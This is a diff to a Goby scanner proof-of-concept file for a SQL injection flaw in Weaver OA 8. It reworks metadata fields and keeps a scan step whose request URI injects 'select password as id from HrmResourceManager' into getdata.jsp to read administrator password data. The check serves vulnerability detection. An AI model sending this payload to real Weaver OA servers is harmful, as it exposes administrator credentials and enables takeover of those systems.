@@ -5,15 +5,19 @@
             "SQL Injection"
       ],
       "GobyQuery": "app=\"Weaver-OA\"",
-      "Description": "There is a SQL injection vulnerability in Pan micro OA V8, through which an attacker can obtain administrator and server privileges",
+      "Description": "",
       "Product": "Weaver OA 8",
-      "Homepage": "https://www.weaver.com.cn/",
-      "Author": "PeiQi",
-      "Impact": "",
-      "Recommandation": "<p>undefined</p>",
-      "References": [
-            "http://wiki.peiqi.tech"
-      ],
+      "Homepage": "https://weaver.com/",
+      "Author": "",
+      "Impact": "There is a SQL injection vulnerability in Pan micro OA V8, through which an attacker can obtain administrator and server privileges.",
+      "Recommendation": "",
+      "References": [],
+      "HasExp": false,
+      "ExpParams": null,
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
       "ScanSteps": [
             "AND",
             {
@@ -21,7 +25,7 @@
                         "method": "GET",
                         "uri": "/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20password%20as%20id%20from%20HrmResourceManager",
                         "follow_redirect": false,
-                        "header": {},
+                        "header": null,
                         "data_type": "text",
                         "data": ""
                   },
@@ -47,7 +51,7 @@
                                     "type": "item",
                                     "variable": "$body",
                                     "operation": "not contains",
-                                    "value": "<html>",
+                                    "value": "&lt;html&gt;",
                                     "bz": ""
                               },
                               {
@@ -62,6 +66,6 @@
                   "SetVariable": []
             }
       ],
-      "PostTime": "2021-04-10 08:00:20",
-      "GobyVersion": "1.8.255"
+      "PostTime": "0000-00-00 00:00:00",
+      "GobyVersion": "0.0.0"
 }
